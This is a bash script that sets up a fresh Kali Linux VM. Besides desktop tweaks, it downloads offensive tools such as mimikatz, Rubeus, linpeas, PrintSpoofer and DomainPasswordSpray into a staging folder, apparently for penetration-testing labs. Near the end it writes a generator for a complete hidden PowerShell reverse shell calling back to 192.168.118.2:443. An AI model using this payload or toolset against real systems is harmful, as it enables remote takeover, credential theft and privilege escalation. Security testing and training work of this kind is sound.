#!/usr/bin/env bash
# kali-setup.sh — One-shot personalization for fresh Kali VMs.

set -uo pipefail

# Unified logging system
LOG_FILE="/tmp/kali-setup-$(date +%Y%m%d-%H%M%S).log"
log() {
    local level="$1"
    shift
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local message="[$timestamp] [$level] $*"
    echo "$message" | tee -a "$LOG_FILE"
}

log_info() { log "INFO" "$@"; }
log_warn() { log "WARN" "$@"; }
log_error() { log "ERROR" "$@"; }
log_success() { log "SUCCESS" "$@"; }

# Check if sudo is available
if ! command -v sudo >/dev/null 2>&1; then
    log_error "sudo not found - this script requires sudo access"
    exit 1
fi

log_info "Starting kali-setup.sh - logging to $LOG_FILE"

# Make apt non-interactive (avoids tzdata prompts)
export DEBIAN_FRONTEND=noninteractive

# =====================================================
#  WHAT THIS DOES
#   • apt update/upgrade, then installs base packages
#   • TIME: sets timezone to Europe/Berlin + enables NTP
#   • TERMINAL: font size 16 (QTerminal + Xfce + GNOME)
#   • WALLPAPER: sets your chosen image (QTerminal + Xfce + GNOME)
#   • Stages common tools into ~/www (prefers local copies)
# =====================================================

# --------- EDITABLE SETTINGS ---------------------------------
APT_PACKAGES=(
  openssh-server
  curl
  jq
  git
  dbus-x11
  kali-community-wallpapers
  open-vm-tools
  open-vm-tools-desktop
  burpsuite
  seclists
  gobuster
  feroxbuster
  mingw-w64
  golang-go
  sshuttle
  exploitdb
  bloodhound
  unzip
)

TIMEZONE="Europe/Berlin"

WALLPAPER_SRC="/usr/share/backgrounds/kali-16x9/kali-nord-3840x2160.png"
WALLPAPER_DST="$HOME/Pictures/kali-setup-wallpaper.jpg"
# -------------------------------------------------------------

# Safe execution wrapper for critical operations
safe_execute() {
    local description="$1"
    shift
    log_info "Starting: $description"
    if "$@"; then
        log_success "Completed: $description"
        return 0
    else
        log_error "Failed: $description (exit code: $?)"
        return 1
    fi
}

# Safe execution wrapper for non-critical operations
safe_try() {
    local description="$1"
    shift
    log_info "Attempting: $description"
    if "$@"; then
        log_success "Completed: $description"
        return 0
    else
        log_warn "Failed: $description (exit code: $?) - continuing anyway"
        return 1
    fi
}

# Check if file/directory already exists and log appropriately
check_exists() {
    local path="$1"
    local description="${2:-$path}"
    if [[ -e "$path" ]]; then
        log_info "Already exists: $description - skipping"
        return 0
    else
        log_info "Not found: $description - will create/download"
        return 1
    fi
}

# Zsh: ensure shared history across sessions
log_info "Enabling zsh shared history..."
ZSHRC="$HOME/.zshrc"
if [[ -f "$ZSHRC" ]]; then
    if grep -Eq '^\s*#\s*setopt\s+share_history' "$ZSHRC"; then
      sed -i 's/^\s*#\s*setopt\s\+share_history/setopt share_history/' "$ZSHRC"
      log_success "Uncommented setopt share_history in $ZSHRC"
    fi
    if ! grep -Eq '^\s*setopt\s+share_history' "$ZSHRC"; then
      printf '\nsetopt share_history\n' >> "$ZSHRC"
      log_success "Added setopt share_history to $ZSHRC"
    fi
else
    log_warn "No .zshrc found at $ZSHRC - skipping zsh configuration"
fi

safe_execute "Updating package lists and upgrading system" sudo apt-get -yq update && sudo apt-get -yq upgrade

safe_execute "Installing base packages" sudo apt-get -yq install "${APT_PACKAGES[@]}"

safe_execute "Enabling and (re)starting SSH service" sudo systemctl enable ssh && sudo systemctl restart ssh

# ===== Time / Timezone =======================================================
log_info "Setting timezone to ${TIMEZONE} and enabling NTP..."
safe_try "Setting timezone" sudo timedatectl set-timezone "${TIMEZONE}"
safe_try "Enabling NTP" sudo timedatectl set-ntp true
safe_try "Syncing hardware clock" sudo hwclock --systohc

# ===== Terminal font size = 16 (QTerminal + Xfce + GNOME) ===================
log_info "Setting terminal font size to 16..."

# QTerminal (prefer .conf, fallback .ini)
QCONF="$HOME/.config/qterminal.org/qterminal.conf"
[[ -f "$QCONF" ]] || QCONF="$HOME/.config/qterminal.org/qterminal.ini"
mkdir -p "$(dirname "$QCONF")"
[[ -f "$QCONF" ]] || printf "[General]\n" > "$QCONF"
grep -q '^\[General\]' "$QCONF" || printf '\n[General]\n' >> "$QCONF"

if grep -q '^[Uu]se[Ss]ystem[Ff]ont=' "$QCONF"; then
  sed -i 's/^[Uu]se[Ss]ystem[Ff]ont=.*/useSystemFont=false/' "$QCONF"
else
  printf 'useSystemFont=false\n' >> "$QCONF"
fi
if grep -q '^[Ff]ont[Ss]ize=' "$QCONF"; then
  sed -i 's/^[Ff]ont[Ss]ize=.*/fontSize=16/' "$QCONF"
else
  printf 'fontSize=16\n' >> "$QCONF"
fi
family="$(grep -m1 '^fontFamily=' "$QCONF" | cut -d= -f2 || true)"
log_success "QTerminal font size set to 16 (family stays ${family:-unchanged})"

# Xfce Terminal
if command -v xfconf-query >/dev/null 2>&1; then
  safe_try "Configuring Xfce Terminal font" xfconf-query -c xfce4-terminal -p /general/use-system-font -s false && xfconf-query -c xfce4-terminal -p /general/fontName -s "Monospace 16"
fi

# GNOME Terminal
if command -v gsettings >/dev/null 2>&1 && gsettings list-schemas | grep -q 'org.gnome.Terminal.ProfilesList'; then
  PROFILE_ID="$(gsettings get org.gnome.Terminal.ProfilesList default | tr -d \' || true)"
  if [[ -n "$PROFILE_ID" ]]; then
    BASE="org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/"
    safe_try "Configuring GNOME Terminal font" gsettings set "$BASE" use-system-font false && gsettings set "$BASE" font "Monospace 16"
  fi
fi

# ===== Decompress rockyou.txt.gz ==========================================
ROCKYOU_DIR="/usr/share/wordlists"
if check_exists "$ROCKYOU_DIR/rockyou.txt" "rockyou.txt"; then
    log_success "rockyou.txt already present"
elif [[ -f "$ROCKYOU_DIR/rockyou.txt.gz" ]]; then
    log_info "Extracting rockyou.txt from rockyou.txt.gz..."
    if safe_try "Extracting rockyou.txt" sudo gzip -d "$ROCKYOU_DIR/rockyou.txt.gz"; then
        log_success "Extracted: $ROCKYOU_DIR/rockyou.txt"
    fi
else
    log_warn "Neither rockyou.txt nor rockyou.txt.gz found in $ROCKYOU_DIR"
fi

# ===== Tools: ~/www (local-copy-or-download, resilient) ======================
log_info "Preparing ~/www with common tools (prefer local copies)..."
WWW_DIR="$HOME/www"
mkdir -p "$WWW_DIR"

need() { 
    if ! command -v "$1" >/dev/null 2>&1; then
        log_info "Installing required package: $1"
        safe_try "Installing $1" sudo apt-get -yq install "$1"
    fi
}
need curl

# Curl with retries + UA
UA="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
_fetch() { 
    local retries=3
    local delay=2
    local attempt=1
    
    while [[ $attempt -le $retries ]]; do
        if curl -fL --retry 3 --retry-delay 2 -A "$UA" "$@"; then
            return 0
        fi
        log_warn "Fetch attempt $attempt failed for: $*"
        ((attempt++))
        [[ $attempt -le $retries ]] && sleep $delay
    done
    return 1
}

# Helper: fetch the first asset on a GitHub "latest" page that matches a regex
gh_latest_asset() { # usage: gh_latest_asset "user/repo" "regex" "outfile"
  local repo="$1" regex="$2" out="$3" page
  page="$(mktemp)"
  if _fetch -o "$page" "https://github.com/$repo/releases/latest"; then
    url="$(grep -Eo "https://github.com/$repo/releases/download/[^\"']+/[^\"']+" "$page" | grep -Ei "$regex" | head -n1 || true)"
    if [[ -n "$url" ]]; then
        _fetch -o "$out" "$url"
    else
        log_warn "No asset matching '$regex' found for $repo"
        rm -f "$page"
        return 1
    fi
  else
    log_error "Failed to fetch releases page for $repo"
    rm -f "$page"
    return 1
  fi
  rm -f "$page"
}

# Try local copy first, else try a list of URLs until one works
copy_or_try_urls() {
  local pattern="$1" dest="$2"; shift 2
  local found
  
  # Skip if destination already exists
  if check_exists "$dest" "$(basename "$dest")"; then
    return 0
  fi
  
  found="$(sudo find /usr/share -maxdepth 8 -type f -iname "$pattern" 2>/dev/null | head -n1 || true)"
  if [[ -n "$found" ]]; then
    log_info "Found local copy: $found -> $dest"
    if sudo cp -f "$found" "$dest"; then
        log_success "Copied local file to $dest"
        return 0
    else
        log_warn "Failed to copy local file, will try downloads"
    fi
  fi
  
  for url in "$@"; do
    log_info "Downloading $dest from $url"
    if _fetch -o "$dest" "$url"; then 
        log_success "Downloaded $dest"
        return 0
    fi
    log_warn "Failed to download from: $url (will try next)"
  done
  log_error "All sources failed for $dest"
  return 1
}

# ---------- Sysinternals Suite ----------
if check_exists "$WWW_DIR/sysinternals" "Sysinternals Suite"; then
    log_success "Sysinternals already present - skipping"
else
    log_info "Downloading Sysinternals Suite"
    need unzip
    TMPZ="/tmp/sysinternals.zip"
    if _fetch -o "$TMPZ" "https://download.sysinternals.com/files/SysinternalsSuite.zip"; then
        mkdir -p "$WWW_DIR/sysinternals"
        if unzip -oq "$TMPZ" -d "$WWW_DIR/sysinternals"; then
            log_success "Sysinternals Suite extracted to $WWW_DIR/sysinternals"
        else
            log_error "Failed to extract Sysinternals Suite"
        fi
        rm -f "$TMPZ"
    else
        log_error "Sysinternals download failed"
    fi
fi

# ---------- linpeas.sh ----------
safe_try "Getting linpeas.sh" copy_or_try_urls "linpeas.sh" "$WWW_DIR/linpeas.sh" \
  "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
safe_try "Making linpeas.sh executable" chmod +x "$WWW_DIR/linpeas.sh"

# ---------- LinEnum.sh ----------
safe_try "Getting LinEnum.sh" copy_or_try_urls "LinEnum.sh" "$WWW_DIR/LinEnum.sh" \
  "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" \
  "https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh"
safe_try "Making LinEnum.sh executable" chmod +x "$WWW_DIR/LinEnum.sh"

# ---------- unix-privesc-check ----------
safe_try "Getting unix-privesc-check" copy_or_try_urls "unix-privesc-check" "$WWW_DIR/unix-privesc-check" \
  "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check" \
  "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/main/unix-privesc-check"
safe_try "Making unix-privesc-check executable" chmod +x "$WWW_DIR/unix-privesc-check"

# ---------- mimikatz.exe (zip upstream) ----------
if check_exists "$WWW_DIR/mimikatz.exe" "mimikatz.exe"; then
    log_success "mimikatz.exe already present - skipping"
else
    log_info "Getting mimikatz.exe"
    if safe_try "Downloading mimikatz" _fetch -o "$WWW_DIR/mimikatz.exe" "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"; then
        # If we accidentally saved a zip (URL above), extract mimikatz.exe
        if file "$WWW_DIR/mimikatz.exe" 2>/dev/null | grep -qi zip; then
            need unzip
            TMPZ="$WWW_DIR/mimikatz_trunk.zip"
            mv -f "$WWW_DIR/mimikatz.exe" "$TMPZ"
            unzip -oq "$TMPZ" -d "$WWW_DIR/_mimi"
            CAND="$(find "$WWW_DIR/_mimi" -iname mimikatz.exe | head -n1 || true)"
            if [[ -n "$CAND" ]]; then
                mv -f "$CAND" "$WWW_DIR/mimikatz.exe"
                log_success "Extracted mimikatz.exe from archive"
            else
                log_error "Could not find mimikatz.exe in archive"
            fi
            rm -rf "$WWW_DIR/_mimi" "$TMPZ"
        fi
    fi
fi

# ---------- SharpHound.ps1 ----------
safe_try "Getting SharpHound.ps1" copy_or_try_urls "SharpHound.ps1" "$WWW_DIR/SharpHound.ps1" \
  "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" \
  "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/main/Collectors/SharpHound.ps1"

# ---------- WinPEASx64.exe ----------
safe_try "Getting WinPEASx64.exe" copy_or_try_urls "winpeasx64.exe" "$WWW_DIR/WinPEASx64.exe" \
  "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"

# ---------- PowerUp.ps1 ----------
safe_try "Getting PowerUp.ps1" copy_or_try_urls "PowerUp.ps1" "$WWW_DIR/PowerUp.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/main/Privesc/PowerUp.ps1"

# ---------- PowerView.ps1 ----------
safe_try "Getting PowerView.ps1" copy_or_try_urls "PowerView.ps1" "$WWW_DIR/PowerView.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/main/Recon/PowerView.ps1"

# ---------- Kerbrute (linux + windows) ----------
if ! check_exists "$WWW_DIR/kerbrute_linux_amd64" "kerbrute_linux_amd64"; then
    if safe_try "Getting kerbrute_linux_amd64" copy_or_try_urls "kerbrute*linux*amd64*" "$WWW_DIR/kerbrute_linux_amd64" \
        "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"; then
        safe_try "Making kerbrute_linux_amd64 executable" chmod +x "$WWW_DIR/kerbrute_linux_amd64"
    fi
fi

if ! check_exists "$WWW_DIR/kerbrute_windows_amd64.exe" "kerbrute_windows_amd64.exe"; then
    safe_try "Getting kerbrute_windows_amd64.exe" copy_or_try_urls "kerbrute*windows*amd64*.exe" "$WWW_DIR/kerbrute_windows_amd64.exe" \
        "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe"
fi

# --- Chisel (build from source: linux_amd64 + windows_amd64) ---
if check_exists "$WWW_DIR/chisel_linux_amd64" "chisel_linux_amd64" && check_exists "$WWW_DIR/chisel_windows_amd64.exe" "chisel_windows_amd64.exe"; then
    log_success "Chisel already present in $WWW_DIR - skipping build"
else
    log_info "Building chisel from source (linux & windows)..."
    need git
    if ! command -v go >/dev/null 2>&1; then
        log_info "Installing Go..."
        safe_try "Installing golang-go" sudo apt-get -yq install golang-go
    fi
    # upx is optional (to compress); try both package names
    if ! command -v upx >/dev/null 2>&1; then
        safe_try "Installing upx" sudo apt-get -yq install upx || sudo apt-get -yq install upx-ucl
    fi

    BUILD_DIR="/tmp/_build_chisel"
    rm -rf "$BUILD_DIR"
    
    if safe_try "Cloning chisel repository" git clone --depth 1 https://github.com/jpillora/chisel.git "$BUILD_DIR"; then
        pushd "$BUILD_DIR" >/dev/null
        
        # Linux amd64
        log_info "Building chisel for Linux amd64..."
        if safe_try "Building chisel_linux_amd64" sh -c 'CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -a -installsuffix cgo -o chisel_linux_amd64'; then
            safe_try "Compressing chisel_linux_amd64" upx --brute chisel_linux_amd64
        fi

        # Windows amd64
        log_info "Building chisel for Windows amd64..."
        if safe_try "Building chisel_windows_amd64.exe" sh -c 'CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -a -installsuffix cgo -o chisel_windows_amd64.exe'; then
            safe_try "Compressing chisel_windows_amd64.exe" upx --brute chisel_windows_amd64.exe
        fi

        popd >/dev/null

        # Move built files to www directory
        if [[ -f "$BUILD_DIR/chisel_linux_amd64" ]]; then
            mv -f "$BUILD_DIR/chisel_linux_amd64" "$WWW_DIR/chisel_linux_amd64"
            safe_try "Making chisel_linux_amd64 executable" chmod +x "$WWW_DIR/chisel_linux_amd64"
            log_success "chisel_linux_amd64 ready in $WWW_DIR"
        fi
        
        if [[ -f "$BUILD_DIR/chisel_windows_amd64.exe" ]]; then
            mv -f "$BUILD_DIR/chisel_windows_amd64.exe" "$WWW_DIR/chisel_windows_amd64.exe"
            log_success "chisel_windows_amd64.exe ready in $WWW_DIR"
        fi
        
        rm -rf "$BUILD_DIR"
    else
        log_error "Failed to clone chisel repository"
    fi
fi

# --- Rubeus (try official .exe, then official zip, then compiled-binaries mirror) ---
if check_exists "$WWW_DIR/Rubeus.exe" "Rubeus.exe"; then
    log_success "Rubeus.exe already present - skipping"
else
    log_info "Getting Rubeus.exe"
    if safe_try "Downloading Rubeus.exe directly" _fetch -o "$WWW_DIR/Rubeus.exe" "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe"; then
        log_success "Downloaded Rubeus.exe directly"
    else
        log_info "Trying Rubeus.zip..."
        need unzip
        TMPZ="/tmp/Rubeus-latest.zip"
        if safe_try "Downloading Rubeus.zip" _fetch -o "$TMPZ" "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.zip"; then
            unzip -oq "$TMPZ" -d "$WWW_DIR/_rubeus"
            CAND="$(find "$WWW_DIR/_rubeus" -iname Rubeus.exe | head -n1 || true)"
            if [[ -n "$CAND" ]]; then
                mv -f "$CAND" "$WWW_DIR/Rubeus.exe"
                log_success "Extracted Rubeus.exe from archive"
            else
                log_warn "Could not find Rubeus.exe in archive"
            fi
            rm -rf "$WWW_DIR/_rubeus" "$TMPZ"
        fi
        # Fallback to compiled binaries mirror
        if [[ ! -f "$WWW_DIR/Rubeus.exe" ]]; then
            safe_try "Trying compiled binaries mirror" _fetch -o "$WWW_DIR/Rubeus.exe" "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"
            if [[ -s "$WWW_DIR/Rubeus.exe" ]]; then
                log_success "Downloaded Rubeus.exe from mirror"
            else
                log_error "All Rubeus download methods failed"
            fi
        fi
    fi
fi

# ---------- Inveigh (Windows x64) — fetch BOTH builds via GitHub API ----------
# net8.0 (NativeAOT preferred, fallback trimmed-single)  -> ~/www/Inveigh.exe
# net4.6.2 (legacy)                                      -> ~/www/Inveigh-462.exe

get_gh_asset() {  # usage: get_gh_asset "user/repo" "regex" "outfile"
  local repo="$1" re="$2" out="$3" url
  url="$(
    curl -fsSL -A "$UA" "https://api.github.com/repos/$repo/releases/latest" \
      | jq -r --arg re "$re" '.assets[]?.browser_download_url | select(test($re;"i"))' \
      | head -n1 2>/dev/null || true
  )"
  if [[ -n "$url" ]]; then
      curl -fL -A "$UA" -o "$out" "$url"
  else
      return 1
  fi
}

# --- net8.0 (NativeAOT -> trimmed-single) ---
if check_exists "$WWW_DIR/Inveigh.exe" "Inveigh.exe (net8.0)"; then
    log_success "Inveigh.exe already present - skipping"
else
    log_info "Getting Inveigh.exe (net8.0 win-x64)"
    TMP="/tmp/inveigh-net8.zip"; rm -f "$TMP"
    if safe_try "Downloading net8.0 NativeAOT" get_gh_asset "Kevin-Robertson/Inveigh" 'inveigh-net8\.0-win-x64-nativeaot.*\.zip$' "$TMP"; then
        :
    elif safe_try "Downloading net8.0 trimmed-single" get_gh_asset "Kevin-Robertson/Inveigh" 'inveigh-net8\.0-win-x64-trimmed-single.*\.zip$' "$TMP"; then
        :
    fi
    
    if [[ -s "$TMP" ]]; then
        TMPD="$(mktemp -d)"
        unzip -q -j "$TMP" '*Inveigh*.exe' -d "$TMPD" 2>/dev/null || true
        SRC="$(ls "$TMPD"/*Inveigh*.exe 2>/dev/null | head -n1 || true)"
        if [[ -n "$SRC" ]]; then
            cp -f "$SRC" "$WWW_DIR/Inveigh.exe"
            log_success "Inveigh.exe ready"
        else
            log_error "No EXE found in net8 archive"
        fi
        rm -rf "$TMP" "$TMPD"
    else
        log_error "Failed to download net8.0 asset"
    fi
fi

# --- .NET Framework 4.6.2 (legacy) ---
if check_exists "$WWW_DIR/Inveigh-462.exe" "Inveigh-462.exe (net4.6.2)"; then
    log_success "Inveigh-462.exe already present - skipping"
else
    log_info "Getting Inveigh-462.exe (net4.6.2 win-x64)"
    TMP="/tmp/inveigh-net462.zip"; rm -f "$TMP"
    if safe_try "Downloading net4.6.2" get_gh_asset "Kevin-Robertson/Inveigh" 'inveigh-net4\.6\.2.*\.zip$' "$TMP"; then
        if [[ -s "$TMP" ]]; then
            TMPD="$(mktemp -d)"
            unzip -q -j "$TMP" '*Inveigh*.exe' -d "$TMPD" 2>/dev/null || true
            SRC="$(ls "$TMPD"/*Inveigh*.exe 2>/dev/null | head -n1 || true)"
            if [[ -n "$SRC" ]]; then
                cp -f "$SRC" "$WWW_DIR/Inveigh-462.exe"
                log_success "Inveigh-462.exe ready"
            else
                log_error "No EXE found in net4.6.2 archive"
            fi
            rm -rf "$TMP" "$TMPD"
        else
            log_error "Failed to download net4.6.2 asset"
        fi
    fi
fi


# --- PrintSpoofer (x64 only available in release) ---
safe_try "Getting PrintSpoofer64.exe" copy_or_try_urls "PrintSpoofer64.exe" "$WWW_DIR/PrintSpoofer64.exe" \
  "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"

# --- GodPotato (both .NET builds) ---
safe_try "Getting GodPotato-NET4.exe" copy_or_try_urls "GodPotato-NET4.exe" "$WWW_DIR/GodPotato-NET4.exe" \
  "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
safe_try "Getting GodPotato-NET2.exe" copy_or_try_urls "GodPotato-NET2.exe" "$WWW_DIR/GodPotato-NET2.exe" \
  "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe"

# --- Ncat (latest portable from Nmap) ---
if check_exists "$WWW_DIR/ncat.exe" "ncat.exe"; then
    log_success "ncat.exe already present - skipping"
else
    log_info "Getting ncat.exe (latest portable from Nmap)"
    need unzip
    idx="$(mktemp)"
    if safe_try "Fetching Nmap distribution page" _fetch -o "$idx" "https://nmap.org/dist/"; then
        ZIP_URL="$(grep -Eo 'ncat-portable-[0-9][0-9A-Za-z\.\-]*\.zip' "$idx" | sed 's#^#https://nmap.org/dist/#' | sort -V | tail -n1 || true)"
        rm -f "$idx"
        if [[ -n "$ZIP_URL" ]]; then
            TMPZ="/tmp/ncat-portable.zip"
            if safe_try "Downloading ncat portable" _fetch -o "$TMPZ" "$ZIP_URL"; then
                unzip -oj "$TMPZ" "*/ncat.exe" -d "$WWW_DIR" 2>/dev/null || unzip -oj "$TMPZ" "ncat.exe" -d "$WWW_DIR" 2>/dev/null || true
                rm -f "$TMPZ"
            fi
        fi
    fi
    if [[ -f "$WWW_DIR/ncat.exe" ]]; then
        log_success "ncat.exe ready"
    else
        log_error "Failed to get ncat.exe"
    fi
fi

# --- powercat.ps1 (PowerShell netcat) ---
if check_exists "$WWW_DIR/powercat.ps1" "powercat.ps1"; then
    log_success "powercat.ps1 already present - skipping"
else
    log_info "Getting powercat.ps1"
    found=""
    if command -v locate >/dev/null 2>&1; then
        found="$(locate -i '/powercat.ps1' 2>/dev/null | head -n1 || true)"
    fi
    [[ -z "$found" ]] && found="$(sudo find /usr -type f -iname 'powercat.ps1' 2>/dev/null | head -n1 || true)"
    if [[ -n "$found" && -f "$found" ]]; then
        log_info "Found locally: $found"
        cp -f "$found" "$WWW_DIR/powercat.ps1"
        log_success "powercat.ps1 copied from local system"
    else
        safe_try "Downloading powercat.ps1" copy_or_try_urls "powercat.ps1" "$WWW_DIR/powercat.ps1" \
          "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
    fi
    if [[ -f "$WWW_DIR/powercat.ps1" ]]; then
        log_success "powercat.ps1 ready"
    else
        log_error "Failed to get powercat.ps1"
    fi
fi

# --- JAWS-enum.ps1 (Windows enum script) ---
if check_exists "$WWW_DIR/JAWS-enum.ps1" "JAWS-enum.ps1"; then
    log_success "JAWS-enum.ps1 already present - skipping"
else
    log_info "Getting JAWS-enum.ps1"
    found=""
    if command -v locate >/dev/null 2>&1; then
        found="$(locate -i '/jaws-enum.ps1' 2>/dev/null | head -n1 || true)"
    fi
    [[ -z "$found" ]] && found="$(sudo find /usr -type f -iname 'jaws-enum.ps1' 2>/dev/null | head -n1 || true)"
    if [[ -n "$found" && -f "$found" ]]; then
        log_info "Found locally: $found"
        cp -f "$found" "$WWW_DIR/JAWS-enum.ps1"
        log_success "JAWS-enum.ps1 copied from local system"
    else
        safe_try "Downloading JAWS-enum.ps1" copy_or_try_urls "jaws-enum.ps1" "$WWW_DIR/JAWS-enum.ps1" \
          "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
          "https://raw.githubusercontent.com/411Hall/JAWS/main/jaws-enum.ps1"
    fi
    if [[ -f "$WWW_DIR/JAWS-enum.ps1" ]]; then
        log_success "JAWS-enum.ps1 ready"
    else
        log_error "Failed to get JAWS-enum.ps1"
    fi
fi

# --- DomainPasswordSpray.ps1 (by dafthack) ---
if check_exists "$WWW_DIR/DomainPasswordSpray.ps1" "DomainPasswordSpray.ps1"; then
    log_success "DomainPasswordSpray.ps1 already present - skipping"
else
    log_info "Getting DomainPasswordSpray.ps1"
    found=""
    if command -v locate >/dev/null 2>&1; then
        found="$(locate -i '/DomainPasswordSpray.ps1' 2>/dev/null | head -n1 || true)"
    fi
    [[ -z "$found" ]] && found="$(sudo find /usr -type f -iname 'DomainPasswordSpray.ps1' 2>/dev/null | head -n1 || true)"
    if [[ -n "$found" && -f "$found" ]]; then
        log_info "Found locally: $found"
        cp -f "$found" "$WWW_DIR/DomainPasswordSpray.ps1"
        log_success "DomainPasswordSpray.ps1 copied from local system"
    else
        safe_try "Downloading DomainPasswordSpray.ps1" copy_or_try_urls "DomainPasswordSpray.ps1" "$WWW_DIR/DomainPasswordSpray.ps1" \
          "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"
    fi
    if [[ -f "$WWW_DIR/DomainPasswordSpray.ps1" ]]; then
        log_success "DomainPasswordSpray.ps1 ready"
    else
        log_error "Failed to get DomainPasswordSpray.ps1"
    fi
fi

# ---------- SharpCollection ----------
if check_exists "$WWW_DIR/SharpCollection" "SharpCollection repository"; then
    log_success "SharpCollection already present - skipping download"
else
    log_info "Cloning SharpCollection into $WWW_DIR/SharpCollection"
    if safe_try "Cloning SharpCollection" git clone --depth 1 https://github.com/Flangvik/SharpCollection.git "$WWW_DIR/SharpCollection"; then
        log_success "SharpCollection cloned successfully"
    fi
fi

# --- Add reverse-shell generator to ~/www ---
log_info "Adding revshell-b64.py to $WWW_DIR"
cat > "$WWW_DIR/revshell-b64.py" <<'PY'
#!/usr/bin/env python3
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
PY
chmod +x "$WWW_DIR/revshell-b64.py"
log_success "revshell-b64.py created and made executable"

# Ensure everything in ~/www is owned by the current user
safe_try "Setting ownership of $WWW_DIR" chown -R "$USER:$USER" "$WWW_DIR"

# --- Update locate database so 'locate' works immediately ---
log_info "Updating locate(mlocate/plocate) database..."
if command -v updatedb >/dev/null 2>&1; then
    if safe_try "Updating locate database" sudo updatedb; then
        log_success "locate database updated"
    fi
else
    log_warn "'updatedb' not found (install 'mlocate' or 'plocate' if needed)"
fi

# ---------- Summary ----------
log_info "Listing ~/www contents:"
if ls -lah "$WWW_DIR" 2>/dev/null; then
    log_success "Directory listing completed"
else
    log_warn "Could not list directory contents"
fi

# ===== DONE ================================================================
log_success "kali-setup finished successfully!"
echo
log_info "Installed apt packages: ${APT_PACKAGES[*]}"
timezone_info="$(timedatectl | grep 'Time zone' 2>/dev/null || echo 'Unable to get timezone info')"
log_info "Timezone now: $timezone_info"
log_info "SSH: enabled and running (check with: systemctl status ssh)"
log_info "Terminal: font set to 16 (QTerminal/Xfce/GNOME)"
log_info "You still have to install Firefox extensions, e.g. FoxyProxy, Wappalyzer"
log_warn "Reminder: change your local password with: passwd"
log_info "Log file saved to: $LOG_FILE"
echo
